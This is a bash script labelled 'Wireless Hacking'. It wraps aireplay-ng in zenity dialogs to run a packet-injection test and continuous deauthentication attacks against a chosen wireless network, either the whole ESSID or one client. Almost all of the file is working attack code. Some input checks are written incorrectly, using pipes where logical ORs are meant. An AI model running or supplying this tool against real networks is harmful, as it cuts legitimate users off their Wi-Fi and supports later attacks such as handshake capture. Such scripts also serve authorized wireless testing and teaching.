prompt1=$(zenity --list --title="Wireless Hacking" --column="Deauth Attack" "Injection Test" "Deauth(ESSID)" "Deauth(ESSID+Client)" --width=300 --height=300)

check_adapter() {
iwconfig | zenity --text-info --title="Available Adapter List" --width=500 --height=300
}

channel_sel() {
wlan=$(ip -o link show | awk -F': ' '{print $2}' | zenity --list --title="Network Interfaces" --column="Interface Name")
channel=$(zenity --entry --title="Channel" --text="Channel:" --width=300)
 if [ -z "$channel" ] | [ -z "$wlan" ]
   then
     zenity --info --title="Error" --text="Please insert input"
     exit 1
  fi
sudo iwconfig $wlan channel $channel | zenity --info --title="Channel Selected" --text="$wlan is now on channel $channel" --width=300
}

if [ "$prompt1" == "Injection Test" ]
then
 check_adapter
 wlan=$(ip -o link show | awk -F': ' '{print $2}' | zenity --list --title="Network Interfaces" --column="Interface Name")
  if [ -z "$wlan" ]
   then
     zenity --info --title="Error" --text="Please insert input"
     exit 1
  fi
 gnome-terminal -- sudo aireplay-ng -9 $wlan
fi

if [ "$prompt1" == "Deauth(ESSID)" ]
then
 check_adapter
 wlan=$(ip -o link show | awk -F': ' '{print $2}' | zenity --list --title="Network Interfaces" --column="Interface Name")
 essid=$(zenity --entry --title="ESSID" --text="ESSID:" --width=300)
  if [ -z "$wlan" ] | [ -z "$essid" ]
   then
     zenity --info --title="Error" --text="Please insert input"
     exit 1
  fi
 channel=$(channel_sel)
 zenity --info --title="Deauth" --text="Deauthing..." | gnome-terminal -- sudo aireplay-ng --deauth 0 -e "$essid" "$wlan"
fi

if [ "$prompt1" == "Deauth(ESSID+Client)" ]
then
 check_adapter
 wlan=$(ip -o link show | awk -F': ' '{print $2}' | zenity --list --title="Network Interfaces" --column="Interface Name")
 essid=$(zenity --entry --title="ESSID" --text="ESSID:" --width=300)
 cbssid=$(zenity --entry --title="Client BSSID" --text="Client BSSID:" --width=300)
  if [ -z "$wlan" ] | [ -z "$essid" ] | [ -z "$cbssid" ] | [ -z "$channel" ]
   then
     zenity --info --title="Error" --text="Please insert input"
     exit 1
  fi
 channel=$(channel_sel)
 zenity --info --title="Deauth" --text="Deauthing..." | gnome-terminal -- sudo aireplay-ng --deauth 0 -e "$essid" -c "$cbssid" "$wlan"
fi

